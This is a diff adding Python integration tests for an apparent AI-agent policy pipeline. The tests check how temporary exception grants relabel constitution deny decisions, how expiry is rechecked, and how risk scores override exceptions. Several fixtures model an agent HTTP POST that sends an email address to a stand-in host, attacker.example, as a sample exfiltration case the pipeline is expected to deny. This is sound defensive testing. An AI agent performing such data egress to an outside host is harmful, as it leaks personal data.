@@ -25,6 +25,7 @@ driven with asyncio.run, matching the established convention in the integration 
 from __future__ import annotations
 
 import asyncio
+from datetime import datetime, timedelta, timezone
 from uuid import UUID, uuid4
 
 from sqlalchemy import select
@@ -249,7 +250,7 @@ def test_injected_thresholds_reach_the_graduated_stage() -> None:
 # --- Slice 3: constitution integration (real compiled engine; skip w/o OPA) ---
 
 
-def _wire_real_engine(constitution_wasm, *, audit=None):
+def _wire_real_engine(constitution_wasm, *, audit=None, exceptions=None, scorers=None):
     from agentos_pipeline.policy import ConstitutionPolicyEngine
 
     engine = ConstitutionPolicyEngine(
@@ -262,8 +263,9 @@ def _wire_real_engine(constitution_wasm, *, audit=None):
     pipeline = Pipeline(
         identity=FakeIdentityStage(ok=True, trust_score=0.5),
         policy=engine,
-        scorers=[],
+        scorers=scorers if scorers is not None else [],
         audit=audit,
+        exceptions=exceptions,
     )
     return pipeline, engine, audit
 
@@ -600,6 +602,137 @@ def test_cached_interpreter_end_to_end_two_identical_actions_one_interpret() -> 
     asyncio.run(pipeline.evaluate(_action()))
     asyncio.run(pipeline.evaluate(_action()))
     assert inner.calls == 1
+
+
+# --- Slice 6a-5: temporary-exception transform (POL-13) -----------------------
+
+
+class FakeExceptionLookup:
+    """An injected ExceptionLookup over an in-test grant table. Deliberately does
+    NOT filter expired grants — the pipeline must re-check expiry itself
+    (defense in depth; the read-time auto-revoke lives in the real store)."""
+
+    def __init__(self, grants: dict[tuple[str, str], datetime]) -> None:
+        self.grants = grants
+        self.queries: list[tuple[str, tuple[str, ...]]] = []
+
+    def active_for(self, agent_id: str, refs: tuple[str, ...]):
+        self.queries.append((agent_id, refs))
+        return {
+            ref: exp
+            for (a, ref), exp in self.grants.items()
+            if a == agent_id and ref in refs
+        }
+
+
+def _pii_to_unlisted_host_action() -> AgentAction:
+    """Fires BOTH deny principles: 1.1 (unlisted host) and 3.2 (PII egress)."""
+    return AgentAction(
+        agent_id="agent-1", type=ActionType.tool_call, target="http_post",
+        payload={"url": "https://attacker.example/upload",
+                 "content": "contact jane.doe@example.com"},
+        identity_token="tok",
+    )
+
+
+def test_exception_transform_relabels_allow_to_temporary_exception(
+    constitution_wasm, audit_store
+) -> None:
+    """Deny floor (1.1 fired) + active exception for (agent, '1.1') -> final
+    outcome temporary_exception with expires_at set, the transform reason cites
+    the consumed refs, and the audit body carries the expiry (hash-covered)."""
+    from agentos_controlplane.audit import AuditWriter
+    from agentos_controlplane.store.models import AuditRecord
+
+    until = datetime.now(timezone.utc) + timedelta(hours=1)
+    lookup = FakeExceptionLookup({("agent-1", "1.1"): until})
+    pipeline, engine, _ = _wire_real_engine(
+        constitution_wasm, audit=AuditWriter(audit_store), exceptions=lookup
+    )
+    decision = asyncio.run(pipeline.evaluate(_action(url="https://attacker.example/x")))
+
+    assert decision.outcome is Outcome.temporary_exception
+    assert decision.expires_at == until  # earliest (only) consumed expiry
+    applied = [r for r in decision.reasons if r.code == "temporary_exception_applied"]
+    assert len(applied) == 1 and applied[0].stage == "policy"
+    assert applied[0].evidence["refs"] == ["1.1"]
+    assert applied[0].evidence["expires_at"] == until.isoformat()
+    # The fired deny principle is STILL cited — the transform explains, never hides.
+    assert any(
+        r.code == "constitution_principle_fired" and r.principle_ref == "1.1"
+        for r in decision.reasons
+    )
+    # The lookup was scoped to the acting agent's deny refs.
+    assert lookup.queries == [("agent-1", ("1.1",))]
+    with audit_store() as session:
+        body = session.scalars(select(AuditRecord)).first().body
+    assert body["outcome"] == "temporary_exception"
+    assert body["expires_at"] == until.isoformat()  # hash-covered (H3)
+
+
+def test_exception_transform_risk_still_re_restricts_to_deny(constitution_wasm) -> None:
+    """Defense in depth: the transform converts the FLOOR, not the verdict —
+    risk >= deny_at still denies the exception-covered action."""
+    until = datetime.now(timezone.utc) + timedelta(hours=1)
+    lookup = FakeExceptionLookup({("agent-1", "1.1"): until})
+    pipeline, engine, audit = _wire_real_engine(
+        constitution_wasm, exceptions=lookup, scorers=[SpyScorer(0.9)]
+    )
+    decision = asyncio.run(pipeline.evaluate(_action(url="https://attacker.example/x")))
+    assert decision.outcome is Outcome.deny  # risk re-restricted the transformed floor
+    assert decision.expires_at is None       # no relabel on a non-allow outcome
+    # The transform itself is still explained (the floor DID convert).
+    assert any(r.code == "temporary_exception_applied" for r in decision.reasons)
+
+
+def test_expired_exception_is_plain_deny(constitution_wasm) -> None:
+    """Auto-revoke (POL-13): an expired grant is no grant — even when the lookup
+    (wrongly) returns it, the pipeline re-checks expiry."""
+    past = datetime.now(timezone.utc) - timedelta(seconds=1)
+    lookup = FakeExceptionLookup({("agent-1", "1.1"): past})
+    pipeline, engine, audit = _wire_real_engine(constitution_wasm, exceptions=lookup)
+    decision = asyncio.run(pipeline.evaluate(_action(url="https://attacker.example/x")))
+    assert decision.outcome is Outcome.deny
+    assert decision.expires_at is None
+    assert not any(r.code == "temporary_exception_applied" for r in decision.reasons)
+
+
+def test_partial_coverage_of_two_deny_principles_stays_deny(constitution_wasm) -> None:
+    """ALL deny-effect refs must be covered: 1.1 AND 3.2 fire deny; an exception
+    for 1.1 alone leaves the deny floor untouched."""
+    until = datetime.now(timezone.utc) + timedelta(hours=1)
+    lookup = FakeExceptionLookup({("agent-1", "1.1"): until})
+    pipeline, engine, audit = _wire_real_engine(constitution_wasm, exceptions=lookup)
+    decision = asyncio.run(pipeline.evaluate(_pii_to_unlisted_host_action()))
+    assert decision.outcome is Outcome.deny
+    assert not any(r.code == "temporary_exception_applied" for r in decision.reasons)
+    fired = {r.principle_ref for r in decision.reasons
+             if r.code == "constitution_principle_fired"}
+    assert {"1.1", "3.2"} <= fired
+
+
+def test_full_coverage_of_two_deny_principles_transforms(constitution_wasm) -> None:
+    """Positive control for the ALL-refs rule: exceptions for BOTH 1.1 and 3.2
+    convert the floor; expires_at is the EARLIEST consumed expiry."""
+    sooner = datetime.now(timezone.utc) + timedelta(minutes=30)
+    later = datetime.now(timezone.utc) + timedelta(hours=2)
+    lookup = FakeExceptionLookup(
+        {("agent-1", "1.1"): later, ("agent-1", "3.2"): sooner}
+    )
+    pipeline, engine, audit = _wire_real_engine(constitution_wasm, exceptions=lookup)
+    decision = asyncio.run(pipeline.evaluate(_pii_to_unlisted_host_action()))
+    assert decision.outcome is Outcome.temporary_exception
+    assert decision.expires_at == sooner  # earliest expiry wins
+    applied = [r for r in decision.reasons if r.code == "temporary_exception_applied"]
+    assert sorted(applied[0].evidence["refs"]) == ["1.1", "3.2"]
+
+
+def test_no_lookup_injected_behavior_unchanged(constitution_wasm) -> None:
+    """exceptions=None (the default): the deny floor stands exactly as before."""
+    pipeline, engine, audit = _wire_real_engine(constitution_wasm)
+    decision = asyncio.run(pipeline.evaluate(_action(url="https://attacker.example/x")))
+    assert decision.outcome is Outcome.deny
+    assert not any(r.code == "temporary_exception_applied" for r in decision.reasons)
 
 
 # --- Slice 3: PIPE-05 failure semantics (kill-the-control-plane) --------------
